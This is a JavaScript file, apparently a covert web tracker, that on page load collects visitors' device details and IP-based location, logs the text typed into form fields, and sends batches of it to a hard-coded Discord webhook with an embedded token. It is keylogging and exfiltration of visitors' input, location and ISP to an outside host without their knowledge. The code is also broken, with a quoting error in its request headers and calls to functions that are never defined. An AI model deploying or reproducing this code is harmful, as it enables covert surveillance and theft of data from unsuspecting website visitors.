// tracker.js - Full Data Reporting Version
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1392042094637486151/4_8ZIifnSws8hbH09eQaqmZ5EprjhbH20NolzOiYOF0Ii8h6IPypG1b2xVGzQY8Nv0cs'; // REPLACE THIS
const KEYSTROKE_THRESHOLD = 7;

// Main Data Store
const trackingData = {
  page: window.location.href,
  referrer: document.referrer,
  device: getDeviceInfo(),
  interactions: []
};

// 1. INITIALIZATION
document.addEventListener('DOMContentLoaded', () => {
  initializeTracking();
  getGeoLocation().then(geoData => {
    trackingData.device.geo = geoData;
    sendFullReport('PAGE_LOAD');
  });
});

// 2. DEVICE INFO COLLECTION
function getDeviceInfo() {
  const ua = navigator.userAgent;
  return {
    os: getOS(ua),
    browser: getBrowser(ua),
    screen: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: navigator.language,
    touch: 'ontouchstart' in window,
    cookies: navigator.cookieEnabled,
    adBlock: false,
    vpn: false,
    geo: {} // Will be populated later
  };
}

// 3. GEOLOCATION (Enhanced)
async function getGeoLocation() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    return {
      ip: data.ip,
      country: data.country_name,
      city: data.city,
      region: data.region,
      isp: data.org,
      vpn: data.privacy && data.privacy.vpn
    };
  } catch (error) {
    console.error('Geo lookup failed:', error);
    return { ip: 'unknown' };
  }
}

// 4. TRACKING FUNCTIONS
function initializeTracking() {
  trackClicks();
  trackKeystrokes();
  checkAdBlock();
}

function trackKeystrokes() {
  document.addEventListener('input', (e) => {
    const target = e.target;
    if (shouldSkipField(target)) return;
    
    trackingData.interactions.push({
      type: 'keystroke',
      field: getFieldIdentifier(target),
      value: target.value,
      timestamp: new Date().toISOString()
    });

    if (target.value.length % KEYSTROKE_THRESHOLD === 0) {
      sendFullReport('KEYSTROKE_BATCH');
    }
  });
}

// 5. DISCORD REPORTING (Fixed)
async function sendFullReport(trigger) {
  try {
    const embed = {
      title: `📊 ${getReportTitle(trigger)}`,
      color: 0x3498db,
      fields: [],
      timestamp: new Date().toISOString()
    };

    // Add device info
    embed.fields.push(
      { name: '🌐 Page', value: trackingData.page, inline: true },
      { name: '🖥️ OS', value: trackingData.device.os, inline: true },
      { name: '🔍 Browser', value: trackingData.device.browser, inline: true }
    );

    // Add location if available
    if (trackingData.device.geo.ip) {
      embed.fields.push(
        { name: '📍 Location', value: `${trackingData.device.geo.city}, ${trackingData.device.geo.country}`, inline: true },
        { name: '📡 ISP', value: trackingData.device.geo.isp || 'Unknown', inline: true },
        { name: '🛡️ VPN', value: trackingData.device.geo.vpn ? 'Yes' : 'No', inline: true }
      );
    }

    // Add interactions if any
    if (trackingData.interactions.length > 0) {
      const lastInteraction = trackingData.interactions[trackingData.interactions.length - 1];
      if (lastInteraction.type === 'keystroke') {
        embed.fields.push({
          name: '⌨️ Last Input',
          value: `**Field:** ${lastInteraction.field}\n**Value:** \`${lastInteraction.value.slice(-KEYSTROKE_THRESHOLD)}\``
        });
      }
    }

    // Send to Discord
    await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type: 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });

  } catch (error) {
    console.error('Reporting error:', error);
  }
}

// Helper Functions
function getReportTitle(trigger) {
  const titles = {
    'PAGE_LOAD': 'New Visitor',
    'KEYSTROKE_BATCH': 'Input Update',
    'CLICK': 'User Click'
  };
  return titles[trigger] || 'Activity Report';
}

function getFieldIdentifier(element) {
  return element.name || element.id || element.placeholder || 'unlabeled_field';
}

function shouldSkipField(element) {
  const sensitiveTypes = ['password', 'creditcard', 'cvv'];
  return sensitiveTypes.some(type => element.type.includes(type));
}

// Start tracking
console.log('[Tracker] Initialized');
